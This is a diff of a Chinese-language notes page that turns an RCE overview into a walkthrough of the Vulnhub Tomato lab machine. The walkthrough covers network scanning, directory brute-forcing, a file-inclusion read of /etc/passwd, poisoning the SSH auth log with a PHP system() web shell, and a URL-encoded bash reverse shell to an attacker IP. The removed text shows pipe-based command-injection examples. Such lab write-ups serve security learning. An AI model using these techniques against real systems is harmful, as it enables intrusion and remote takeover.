@@ -9,17 +9,17 @@
       
       
       
-        <link rel="prev" href="../PostgreSQL%20%E9%AB%98%E6%9D%83%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-9193%EF%BC%89/">
+        <link rel="prev" href="../Shiro%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%20%EF%BC%88CVE-2020-13933/">
       
       
-        <link rel="next" href="../Shiro%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%20%EF%BC%88CVE-2020-13933/">
+        <link rel="next" href="../XSS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
       
       <link rel="icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.4.3, mkdocs-material-9.1.14">
     
     
       
-        <title>RCE - 陈奕霖</title>
+        <title>Vulnhub Tomato靶机渗透 - 陈奕霖</title>
       
     
     
@@ -67,7 +67,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#rceremote-commandcode-execute" class="md-skip">
+        <a href="#_1" class="md-skip">
           跳转至
         </a>
       
@@ -102,7 +102,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              RCE
+              Vulnhub Tomato靶机渗透
             
           </span>
         </div>
@@ -673,48 +673,11 @@
               
   
   
-    
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          RCE
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../RCE/" class="md-nav__link">
         RCE
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#rceremote-commandcode-execute" class="md-nav__link">
-    RCE(remote command/code execute)概述
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -738,11 +701,55 @@
               
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="../Vulnhub%20Tomato%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Vulnhub Tomato靶机渗透
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         Vulnhub Tomato靶机渗透
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    环境配置
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    漏洞复现
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -947,8 +954,15 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#rceremote-commandcode-execute" class="md-nav__link">
-    RCE(remote command/code execute)概述
+  <a href="#_1" class="md-nav__link">
+    环境配置
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    漏洞复现
   </a>
   
 </li>
@@ -968,19 +982,77 @@
                   
 
 
-  <h1>RCE</h1>
+  <h1>Vulnhub Tomato靶机渗透</h1>
 
-<h2 id="rceremote-commandcode-execute">RCE(remote command/code execute)概述</h2>
-<p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统</p>
-<p>远程系统命令执行</p>
-<p>正常PING</p>
-<p><img alt="img" src="../RCE.assets/wps6.jpg" /> </p>
-<p>Ping 127.0.0.1 | whoami</p>
-<p><img alt="img" src="../RCE.assets/wps7.jpg" /> </p>
-<p>在命令行中一般例如  ipconfig | whoami执行后边命令</p>
-<p>​          ipconfig | |whoami执行前边命令</p>
-<p>​         ipconfig2 | |whoami执行有效命令</p>
-<p>​         ipconfig &amp;&amp;whoami执行后边两个命令</p>
+<h2 id="_1">环境配置</h2>
+<p>下载靶机tomato</p>
+<p>让靶机与在同一网段</p>
+<h2 id="_2">漏洞复现</h2>
+<p>使用arp-scan -l 扫描本地局域网存活主机：</p>
+<p><img alt="img" src="../Untitled.assets/wps39-1693320057951.jpg" /></p>
+<p>探测出靶机地址为192.168.8.150</p>
+<p>nmap扫描开放端口以及相关信息</p>
+<p><img alt="img" src="../Untitled.assets/wps40-1693320057951.jpg" /> </p>
+<p>访问http服务端口查看页面信息：</p>
+<p><img alt="img" src="../Untitled.assets/wps41-1693320057951.jpg" /> </p>
+<p>没有相关可利用信息，继续访问8888端口http服务：</p>
+<p><img alt="img" src="../Untitled.assets/wps42-1693320057951.jpg" /> </p>
+<p><img alt="img" src="../Untitled.assets/wps43-1693320057951.jpg" /> </p>
+<div class="highlight"><pre><span></span><code>/.hta (Status: 403)
+
+/.htaccess (Status: 403)
+
+/.htpasswd (Status: 403)
+
+/antibot_image (Status: 301)
+
+/index.html (Status: 200)
+
+/server-status(Status:403)
+
+gobuster dir -q -u http://192.168.8.150/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,txt,html
+</code></pre></div>
+<p><img alt="img" src="../Untitled.assets/wps44-1693320057951.jpg" /> </p>
+<p>用DIRB进行探测IP</p>
+<p>DIRB是一个Web内容扫描程序。它查找现有的（和/或隐藏的）Web对象。它基本上是通过对Web服务器发起基于字典的攻击并分析响应来工作的。</p>
+<p><img alt="img" src="../Untitled.assets/wps45-1693320057951.jpg" /> </p>
+<p>发现两个网址，进行访问：</p>
+<p><img alt="img" src="../Untitled.assets/wps46-1693320057951.jpg" /> </p>
+<p>点进info.php页面，并查看源代码：</p>
+<p><img alt="img" src="../Untitled.assets/wps47.jpg" /> </p>
+<p>http://192.168.8.150/antibot_image/antibots/info.php?image=../../../../../../etc/passwd</p>
+<p><img alt="img" src="../Untitled.assets/wps48-1693320057951.jpg" /> </p>
+<p>查看源码：</p>
+<p><img alt="img" src="../Untitled.assets/wps49-1693320057951.jpg" /> </p>
+<p>漏洞利用</p>
+<p>已知info.php文件存在文件包含漏洞，以及开放ssh端口，尝试包含ssh认证日志文件/var/log/auth.log，并利用ssh认证用户名实现命令注入：</p>
+<p>尝试用tomato作为用户名进行失败登录，观察相关日志记录：</p>
+<p><img alt="img" src="../Untitled.assets/wps50-1693320057951.jpg" /> </p>
+<div class="highlight"><pre><span></span><code>查看日志：view-source:http://192.168.8.150/antibot_image/antibots/info.php?image=/var/log/auth.log
+</code></pre></div>
+<p><img alt="img" src="../Untitled.assets/wps51.jpg" /> </p>
+<p>利用&lt;?php system($_GET['cmd']);?&gt;作为用户名进行php代码注入：</p>
+<p><img alt="img" src="../Untitled.assets/wps52.jpg" /> </p>
+<p><img alt="img" src="../Untitled.assets/wps53.jpg" /> </p>
+<p><img alt="img" src="../Untitled.assets/wps54-1693320057951.jpg" /> </p>
+<p>Ecoder转换;</p>
+<p><img alt="img" src="../Untitled.assets/wps55-1693320057951.jpg" />打开监听：</p>
+<p>nc -lvp 4444</p>
+<p>在网页浏览：</p>
+<div class="highlight"><pre><span></span><code>view-source:http://192.168.8.150/antibot_image/antibots/info.php?image=../../../../../../var/log/auth.log&amp;cmd=bash%20-c%20%27exec%20bash%20-i%20%26%3E%2Fdev%2Ftcp%2F192.168.8.138%2F4444%20%3C%261%27
+</code></pre></div>
+<p>监听到结果，get shell:</p>
+<p><img alt="img" src="../Untitled.assets/wps56.jpg" /> </p>
+<p>提取权限：</p>
+<p><img alt="img" src="../Untitled.assets/wps57-1693320057951.jpg" /> </p>
+<p><img alt="img" src="../Untitled.assets/wps58-1693320057951.jpg" /> </p>
+<p><img alt="img" src="../Untitled.assets/wps59-1693320057951.jpg" /> </p>
+<p><img alt="img" src="../Untitled.assets/wps60-1693320057951.jpg" /> </p>
+<p><img alt="img" src="../Untitled.assets/wps61-1693320057951.jpg" /> </p>
+<p><img alt="img" src="../Untitled.assets/wps62-1693320057951.jpg" /> </p>
+<p><img alt="img" src="../Untitled.assets/wps63-1693320057951.jpg" /> </p>
+<p><img alt="img" src="../Untitled.assets/wps64-1693320057951.jpg" /> </p>
+<p><img alt="img" src="../Untitled.assets/wps65-1693320057951.jpg" /> </p>
 
 
 
